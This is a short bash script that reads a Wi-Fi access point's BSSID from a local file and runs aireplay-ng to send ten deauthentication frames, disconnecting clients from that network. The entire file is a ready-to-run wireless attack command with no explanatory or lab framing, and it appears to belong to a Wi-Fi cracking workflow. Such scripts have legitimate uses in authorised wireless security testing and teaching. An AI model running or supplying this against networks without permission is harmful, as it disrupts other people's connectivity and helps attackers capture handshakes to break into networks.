#!/bin/bash

bssid=$(<.bssid)
sudo aireplay-ng -0 10 -a $bssid wlan0 #rename to interface
